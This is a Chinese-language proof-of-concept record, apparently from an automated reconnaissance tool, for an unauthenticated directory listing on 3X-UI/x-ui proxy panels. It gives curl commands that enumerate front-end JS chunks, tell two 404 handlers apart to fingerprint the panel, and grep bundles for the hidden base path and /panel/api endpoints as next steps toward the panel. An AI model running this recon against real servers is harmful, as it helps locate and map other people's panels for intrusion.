# 3X-UI / x-ui 面板 2096 /assets/ 匿名目录列表：前端 chunk 全量暴露 + 静态层/路由层双层 404 判据

- **code**: 3x-ui-x-ui-assets-unauth-directory-listing-and-dual-404-base
- **kind**: poc
- **category**: info-leak
- **component**: 3X-UI (x-ui) 面板前端（Vite/Rolldown SPA，Xray + AmneziaWG 分支）
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-02T19:03-19:20Z 在 192.0.2.18:2096 实测（本机 curl.exe --noproxy '*' 直连，另用 ffuf dir-common-10769 全量复核同一结论）：① GET /assets/ → HTTP 200、Content-Type: text/html; charset=utf-8、Content-Length 9773，body 以 <pre> 开头并按 <a href="XrayPage-BAg5yWqc.js"> / <a href="login-CuP_WTT2.js"> / <a href="vendor-swagger-DXLbJ8D3.js"> 形式列出全部前端构建 chunk，据此确定性判定产品为 3X-UI（x-ui，含 Xray/AmneziaWG 分支）；② 对照 GET /assets（无尾斜杠）→ 301/43 归一化；③ GET /assets/nonexist.js → 404/0 字节（静态层独立 404 handler）；④ GET /zz9x7q2k → 404/18 字节 "404 page not found"（根路由层另一套 handler），并证明 SPA 首页与 /panel/api/... 均不在根下、位于随机 webBasePath。原始响应留存 D:/ARTEX/data/tasks/612/i7738/hit__assets_.txt、idx.js（含 window.X_UI_BASE_PATH 与 /panel/api/inbounds/options）。
- **path**: pocs/3x-ui-x-ui-assets-unauth-directory-listing-and-dual-404-base/poc.sh
- **tags**: 3x-ui,x-ui,xray,amneziawg,directory-listing,info-leak,fingerprint,vite,chunk,404-baseline,webbasepath
- **created_at**: 2026-11-02T19:21:14.818Z
- **engine**: 192.0.2.18:2096
- **found_by**: recon

## 描述

3X-UI / x-ui 面板前端所在的明文 HTTP 端口（常见 2096）未对 /assets/ 关闭目录列表，未认证 GET 即 200 返回 <pre> 形式的完整 chunk 清单，暴露产品身份（Xray/AmneziaWG 分支）与全部前端模块名；同时 /assets/* 与根路由使用两套不同 404 handler（0 字节 vs 18 字节 "404 page not found"），可据字节差判定静态层存在、并推断面板启用随机 webBasePath 使 SPA/API 不在根下。属低危信息泄露，价值在于精确指纹 + 免扫描拿到 chunk 名，为后续扒 bundle 取 window.X_UI_BASE_PATH、/panel/api/* 接口清单铺路。

## 用法

```
前置：目标是 3X-UI/x-ui 面板的明文 HTTP 端口（2096 常开；2053/2087 也试但通常仅在 2096 命中），无需认证、无 Host 路由要求。本机有代理时必须 --noproxy '*'，否则回包被代理改写。

1) 匿名列举（主判据）
   curl.exe --noproxy '*' -sS -D - -o assets.txt http://TARGET:2096/assets/
   判据：200 + text/html; charset=utf-8 + body 以 <pre> 开头且含 <a href="XxxPage-<hash>.js">

2) 根路由 404 基线（判 webBasePath 是否随机化）
   curl.exe --noproxy '*' -sS -D - http://TARGET:2096/zz9x7q2k
   判据：404 + Content-Length: 18 + "404 page not found"

3) 静态层 404 基线（判 /assets/* 是否走独立静态 handler）
   curl.exe --noproxy '*' -sS -D - http://TARGET:2096/assets/nonexist.js
   判据：404 + Content-Length: 0（与步骤 2 的 18 字节不同即为两层）

4) 301 归一化确认：GET /assets（无尾斜杠）应回 301 → /assets/

5) 拿到 assets.txt 后：抓 login-*.js / index-*.js / IndexPage-*.js，grep window.X_UI_BASE_PATH 拿到随机面板路径，再 grep /panel/api/ 取接口清单（如 /panel/api/inbounds/options）。

失败常见原因：只打 2096 之外端口；面板挂 TLS 时未换 https/--insecure；把根路径 200 的 nginx 欢迎页误判为面板；代理环境漏写 --noproxy。分档：仅泄露 chunk 名与少量接口线索，不含凭据 → low。
```

## 正文

```
# 3X-UI / x-ui 面板 /assets/ 匿名目录列举

## 0. 前置

- 目标是 3X-UI / x-ui 面板的**明文 HTTP**端口，默认常用 2096（2053/2087 顺带探，但本案例仅 2096 命中）。
- 不需要认证、不需要 Host 路由、不需要 webBasePath。
- 本机有代理环境时**必须** `--noproxy '*'`，否则回包会被代理替换成代理错误页，全部结论失真。

## 1. 主判据：匿名目录列表（一条命令定生死）

```bash
curl.exe --noproxy '*' -sS -D - -o assets.txt \
     http://192.0.2.18:2096/assets/
```

成立时：

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 9773

<!doctype html>
<meta name="viewport" content="width=device-width">
<pre>
<a href="AddClientsToGroupModal-B855RnDJ.js">AddClientsToGroupModal-B855RnDJ.js</a>
<a href="AmneziaWGLogModal-BMaeu7oM.css">AmneziaWGLogModal-BMaeu7oM.css</a>
...
```

## 2. 两条 404 基线（证明存在独立静态层，并给 webBasePath 定性）

```bash
# 根路由层：18 字节 text/plain
curl.exe --noproxy '*' -sS -D - http://192.0.2.18:2096/zz9x7q2k
# -> HTTP/1.1 404 Not Found / Content-Type: text/plain / Content-Length: 18
#    404 page not found

# 静态层：0 字节，空 body
curl.exe --noproxy '*' -sS -D - http://192.0.2.18:2096/assets/nonexist.js
# -> HTTP/1.1 404 Not Found / Content-Length: 0
```

两种 404 字节数/内容体完全不同 ⇒ 2096 上的 `/assets/*` 由独立静态文件 handler 服务，
根路由是另一套 SPA/API handler。

顺带：`GET /assets`（无尾斜杠）→ `301`，是标准目录归一化，不是拦截。

## 3. 产物解读

列举 body 本身就是一份完整 chunk 清单，指纹极强：

- `XrayPage-*.js`、`InboundsPage-*.js`、`ClientsPage-*.js`、`HostsPage-*.js`、`NodesPage-*.js`
- `AmneziaWGLogModal-*`、`amneziawg-obfuscation-*.js` ⇒ 带 AmneziaWG 的分支
- `ApiDocsPage-*`、`vendor-swagger-*` ⇒ 面板自带 API 文档页
- 大量 `*-zh-CN.json` 等 i18n 包

⇒ 结论：3X-UI（x-ui）面板，且为含 Xray + AmneziaWG 的较新分支。

## 4. 往下走

```bash
# 取入口 chunk，里面带 window.X_UI_BASE_PATH 与接口调用
curl.exe --noproxy '*' -sS -o idx.js \
     http://192.0.2.18:2096/assets/IndexPage-tZHM2Ebk.js
grep -oE 'window\.X_UI_BASE_PATH[^,;]*' idx.js
grep -oE '/panel/api/[a-zA-Z0-9/_-]+' idx.js
```

实测 idx.js 中存在 `window.X_UI_BASE_PATH||'/')+"assets/..."` 的 chunk 映射表与
`/panel/api/inbounds/options` 等接口线索 —— 随机 webBasePath 下，根路径 `/panel/api/...`
一律命中 18 字节 404，需要先用 bundle 里的 BASE_PATH 拼真实前缀。

## 5. 失败排错

| 现象 | 原因 |
|---|---|
| 根路径 200 但 body 是十几 KB HTML 模板 | 前置 nginx 欢迎页/反代，不是面板 |
| 所有请求回代理错误页 | 漏 `--noproxy '*'` |
| `/assets/` 403 | 面板关了目录列表、或反代加了 autoindex 限制 |
| 2053/2087 全 timeout | 只开了 2096，或只对外映射了 2096 |
| TLS 端口无响应 | 换 `https://` + `--insecure` |

## 6. 定级

仅泄露前端 chunk 名与少量接口线索，无凭据、无配置 → low（信息面收益，用于指纹与后续 bundle 逆向）。

```
